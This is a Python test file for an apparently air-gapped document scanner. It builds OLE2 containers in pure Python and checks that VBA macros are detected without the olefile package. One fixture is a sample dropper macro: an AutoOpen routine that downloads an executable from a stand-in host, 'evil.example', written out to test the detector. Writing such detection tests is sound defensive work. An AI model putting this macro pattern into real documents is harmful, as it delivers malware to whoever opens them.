"""Zero-dependency CFB (OLE2) reader + end-to-end VBA detection without olefile.

doc-firewall is air-gapped, so legacy-Office / VBA-macro detection must work
with no optional packages installed.  These tests build a *real* CFB container
with a pure-Python writer (no olefile), then verify:

  1. ``CompoundFile`` enumerates streams and reads their bytes back exactly.
  2. The full ``scan_ole_container`` path raises a VBA-dropper finding on a
     container whose only macro module decompresses to AutoOpen + download API
     — proving the gap (olefile absent ⇒ VBA detection inert) is closed.
"""
from __future__ import annotations

import os
import struct
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../src")))

from doc_firewall.analyzers.ole.cfb import CompoundFile
from doc_firewall.analyzers.ole.fast_scan import scan_ole_container
from doc_firewall.config import ScanConfig

_SECTOR = 512
_ENDOFCHAIN = 0xFFFFFFFE
_FREESECT = 0xFFFFFFFF
_FATSECT = 0xFFFFFFFD
_NOSTREAM = 0xFFFFFFFF


# ---------------------------------------------------------------------------
# Minimal CFB (v3, 512-byte sectors) writer — test fixture only.
# ---------------------------------------------------------------------------

class _Node:
    def __init__(self, name, obj_type, data=b""):
        self.name = name
        self.obj_type = obj_type      # 1=storage 2=stream 5=root
        self.data = data
        self.children: list[_Node] = []
        self.idx = -1
        self.start = _ENDOFCHAIN
        self.size = len(data)


def build_cfb(stream_map: dict[tuple, bytes]) -> bytes:
    """Build a valid v3 CFB byte string containing the given streams.

    `stream_map` maps a path tuple (e.g. ("Macros","VBA","Module1")) to bytes.
    Every stream is materialized through the regular FAT (we keep them >= the
    4096 mini-stream cutoff so the writer never needs a mini stream).
    Intermediate storages are created automatically.
    """
    root = _Node("Root Entry", 5)

    def get_child(parent, name, obj_type):
        for c in parent.children:
            if c.name == name:
                return c
        c = _Node(name, obj_type)
        parent.children.append(c)
        return c

    for path, data in stream_map.items():
        node = root
        for part in path[:-1]:
            node = get_child(node, part, 1)
        leaf = get_child(node, path[-1], 2)
        # Pad to the mini-stream cutoff so it lives in the regular FAT.
        if len(data) < 4096:
            data = data + b"\x00" * (4096 - len(data))
        leaf.data = data
        leaf.size = len(data)

    # Flatten directory entries depth-first; index 0 must be the root.
    flat: list[_Node] = []

    def assign(node):
        node.idx = len(flat)
        flat.append(node)
        for c in node.children:
            assign(c)

    assign(root)

    # Lay out data sectors: sector 0 = FAT, sector 1.. = directory, then streams.
    n_dir_sectors = max(1, (len(flat) * 128 + _SECTOR - 1) // _SECTOR)
    fat: list[int] = [_FATSECT]                     # sector 0 is the FAT
    # directory chain occupies sectors 1..n_dir_sectors
    dir_first = len(fat)
    for k in range(n_dir_sectors):
        fat.append(dir_first + k + 1 if k < n_dir_sectors - 1 else _ENDOFCHAIN)

    sector_payloads: dict[int, bytes] = {}
    next_sector = 1 + n_dir_sectors

    for node in flat:
        if node.obj_type != 2:
            continue
        nsec = max(1, (len(node.data) + _SECTOR - 1) // _SECTOR)
        node.start = next_sector
        for k in range(nsec):
            sid = next_sector
            chunk = node.data[k * _SECTOR:(k + 1) * _SECTOR]
            sector_payloads[sid] = chunk.ljust(_SECTOR, b"\x00")
            fat.append(_ENDOFCHAIN if k == nsec - 1 else sid + 1)
            next_sector += 1

    total_sectors = next_sector
    # Pad the FAT to a full sector of 128 entries.
    while len(fat) < 128:
        fat.append(_FREESECT)

    # --- assemble directory bytes ---
    # Children of each parent are chained via the 'right' sibling pointer
    # (left always NOSTREAM); the reader's in-order walk reproduces the paths.
    right_link = {}
    for node in flat:
        for a, b in zip(node.children, node.children[1:], strict=False):
            right_link[a.idx] = b.idx

    dir_bytes = bytearray()
    for node in flat:
        name_utf16 = node.name.encode("utf-16-le")
        name_field = name_utf16.ljust(64, b"\x00")[:64]
        name_len = min(len(name_utf16) + 2, 64)
        child = node.children[0].idx if node.children else _NOSTREAM
        right = right_link.get(node.idx, _NOSTREAM)
        entry = bytearray(128)
        entry[0:64] = name_field
        struct.pack_into("<H", entry, 64, name_len)
        entry[66] = node.obj_type
        entry[67] = 1  # color = black
        struct.pack_into("<I", entry, 68, _NOSTREAM)        # left sibling
        struct.pack_into("<I", entry, 72, right)            # right sibling
        struct.pack_into("<I", entry, 76, child)            # child
        struct.pack_into("<I", entry, 116, node.start if node.obj_type == 2 else _ENDOFCHAIN)
        struct.pack_into("<Q", entry, 120, node.size if node.obj_type == 2 else 0)
        dir_bytes += entry
    # pad directory to whole sectors with free entries
    while len(dir_bytes) % _SECTOR != 0:
        free = bytearray(128)
        struct.pack_into("<I", free, 68, _NOSTREAM)
        struct.pack_into("<I", free, 72, _NOSTREAM)
        struct.pack_into("<I", free, 76, _NOSTREAM)
        dir_bytes += free

    # --- assemble the full file ---
    header = bytearray(512)
    header[0:8] = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1"
    struct.pack_into("<H", header, 24, 0x003E)   # minor version
    struct.pack_into("<H", header, 26, 0x0003)   # major version (v3)
    struct.pack_into("<H", header, 28, 0xFFFE)   # byte order
    struct.pack_into("<H", header, 30, 9)        # sector shift -> 512
    struct.pack_into("<H", header, 32, 6)        # mini sector shift -> 64
    struct.pack_into("<I", header, 44, 1)        # num FAT sectors
    struct.pack_into("<I", header, 48, dir_first)  # first dir sector
    struct.pack_into("<I", header, 56, 4096)     # mini stream cutoff
    struct.pack_into("<I", header, 60, _ENDOFCHAIN)  # first miniFAT sector
    struct.pack_into("<I", header, 64, 0)        # num miniFAT sectors
    struct.pack_into("<I", header, 68, _ENDOFCHAIN)  # first DIFAT sector
    struct.pack_into("<I", header, 72, 0)        # num DIFAT sectors
    # DIFAT array (109 entries) — FAT lives in sector 0.
    struct.pack_into("<I", header, 76, 0)
    for k in range(1, 109):
        struct.pack_into("<I", header, 76 + k * 4, _FREESECT)

    out = bytearray()
    out += header
    # sector 0: FAT
    fat_bytes = b"".join(struct.pack("<I", x) for x in fat[:128])
    out += fat_bytes.ljust(_SECTOR, b"\x00")
    # directory sectors
    out += dir_bytes
    # stream data sectors (in ascending sector id)
    for sid in range(1 + n_dir_sectors, total_sectors):
        out += sector_payloads[sid]
    return bytes(out)


def _make_compressed_vba(source: str) -> bytes:
    """MS-OVBA all-literal compression (mirror of test_vba_macro_detection)."""
    src = source.encode("latin-1", errors="replace")
    chunks = []
    i = 0
    while i < len(src):
        chunks.append(b"\x00" + src[i:i + 8])
        i += 8
    data = b"".join(chunks)
    # bit 15 = compressed, bits 12-14 = 0b011 signature, bits 0-11 = size-1.
    hdr_value = 0x8000 | 0x3000 | ((len(data) - 1) & 0x0FFF)
    return b"\x01" + hdr_value.to_bytes(2, "little") + data


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

class TestCompoundFileRoundTrip:
    def test_listdir_and_read_single_stream(self):
        payload = b"WordDocument body \xff\x00 binary"
        blob = build_cfb({("WordDocument",): payload})
        cf = CompoundFile.open(blob)
        assert cf is not None
        paths = cf.listdir(streams=True, storages=False)
        assert ["WordDocument"] in paths
        with cf.openstream(["WordDocument"]) as s:
            data = s.read(4096)
        assert data.startswith(payload)
        cf.close()

    def test_nested_storage_paths(self):
        blob = build_cfb({
            ("Macros", "VBA", "Module1"): b"hello module",
            ("WordDocument",): b"doc body",
        })
        cf = CompoundFile.open(blob)
        paths = cf.listdir(streams=True, storages=False)
        assert ["Macros", "VBA", "Module1"] in paths
        assert ["WordDocument"] in paths
        storages = cf.listdir(streams=False, storages=True)
        assert ["Macros"] in storages
        assert ["Macros", "VBA"] in storages
        with cf.openstream(["Macros", "VBA", "Module1"]) as s:
            assert s.read(64).startswith(b"hello module")
        cf.close()

    def test_non_cfb_returns_none(self):
        assert CompoundFile.open(b"PK\x03\x04 not a cfb") is None
        assert CompoundFile.open(b"") is None

    def test_truncated_cfb_does_not_raise(self):
        blob = build_cfb({("X",): b"data"})[:300]   # chop mid-header
        cf = CompoundFile.open(blob)               # may be None, must not raise
        if cf is not None:
            cf.close()


class TestEndToEndVbaWithoutOlefile:
    """The core gap-closer: VBA detection on a real CFB with no olefile."""

    def _scan_macro(self, vba_source: str):
        module = b"\x00" * 2048 + _make_compressed_vba(vba_source)  # P-code prefix + source
        blob = build_cfb({
            ("WordDocument",): b"\x00" * 32 + b"document text",
            ("Macros", "VBA", "Module1"): module,
        })
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".doc", delete=False) as fh:
            fh.write(blob)
            path = fh.name
        try:
            return scan_ole_container(path, ScanConfig())
        finally:
            os.unlink(path)

    def test_dropper_detected_end_to_end(self):
        source = (
            'Attribute VB_Name = "Module1"\r\n'
            "Sub AutoOpen()\r\n"
            '    URLDownloadToFile 0, "http://evil.example/p.exe", "C:\\p.exe", 0\r\n'
            "End Sub\r\n"
        )
        findings = self._scan_macro(source)
        subtypes = {(f.evidence or {}).get("subtype") for f in findings}
        assert "vba_dropper" in subtypes, (
            f"VBA dropper not detected end-to-end without olefile; got {subtypes}"
        )
        from doc_firewall.enums import Severity, ThreatID
        dropper = next(f for f in findings if (f.evidence or {}).get("subtype") == "vba_dropper")
        assert dropper.severity == Severity.HIGH
        assert dropper.threat_id == ThreatID.T2_ACTIVE_CONTENT

    def test_benign_macro_not_flagged_end_to_end(self):
        source = (
            "Sub AutoOpen()\r\n"
            '    MsgBox "Welcome!"\r\n'
            "End Sub\r\n"
        )
        findings = self._scan_macro(source)
        vba = [
            f for f in findings
            if (f.evidence or {}).get("subtype") in (
                "vba_dropper", "vba_autorun_shell", "vba_high_risk_api"
            )
        ]
        assert not vba, f"Benign AutoOpen macro should not flag; got {vba}"
